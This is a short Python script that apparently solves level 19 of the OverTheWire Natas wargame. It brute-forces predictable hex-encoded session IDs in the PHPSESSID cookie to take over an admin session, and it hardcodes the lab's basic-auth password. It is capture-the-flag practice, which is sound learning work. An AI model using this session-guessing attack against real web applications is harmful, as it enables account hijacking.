import requests
import time
import binascii

url = "http://natas19.natas.labs.overthewire.org"

for id in range(641):
    sid = bytes(f"{id}-admin", "utf-8").hex()
    print(id, sid)
    login_resp = requests.post(
        url,
        auth=("natas19", "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"),
        params={"username": "admin", "password": "password"},
        headers={"Cookie": f"PHPSESSID={sid}"},
    )
    if "You are an admin" in login_resp.text:
        print(sid)
        print(login_resp.text)
        break
